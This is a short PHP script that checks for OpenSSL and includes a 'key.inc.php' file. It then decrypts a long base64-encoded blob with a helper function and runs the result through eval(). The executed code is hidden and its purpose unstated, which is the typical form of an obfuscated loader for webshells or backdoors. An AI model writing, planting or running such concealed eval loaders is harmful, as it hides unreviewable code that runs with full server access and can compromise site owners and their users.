<?php
if (!function_exists('openssl_decrypt')) {
    die('<h2>Function openssl_decrypt() not found !</h2>');
}
if (!defined('_FILE_')) {
    define("_FILE_", getcwd() . DIRECTORY_SEPARATOR . basename($_SERVER['PHP_SELF']), false);
}
if (!defined('_DIR_')) {
    define("_DIR_", getcwd(), false);
}
if (file_exists('key.inc.php')) {
    include_once('key.inc.php');
} else {
    die('<h2>File key.inc.php not found !</h2>');
}
$e7091 = "L2c5RDhEVVltTGFkTnozWFZWbnJmMW55TXpuNFl1UFBCbkVvUXk5WVF4VUU4TnNtazJLS1ZvN3BudXMrUGdweUN0UEJ3QS9Pem1yY2Q4SjRleFErTkNDUGp0T2J6TWJCQVpJczRPTG5hUEw1a0NwclQxNVhqdDhQYWZ6Y1lEZ3FxcHJnbWJYMFdxYm11MGp3c1EzVGgwYjhrL0l6RVhBQlJJWm5SV1FTUTM2V1Q4dWREalduTlBiVDlkLzgvcWpXc1dEamk4KzJscWhIeXp4ZE1iWjdrc2N6aXdRTGx3bkVnK3ZNR3piMTFFMTV1cmR6NGRCNnhPZUl6MU5GWVFPSUplRGpIenRmdEx5a2FFTUt2czR6OGdaOGRUc2Z6MWhYVEM2dzlvejNqL2IzREg2VmhvcWFYL2o5OHU0WU9xNGM=";
eval(e7061($e7091));
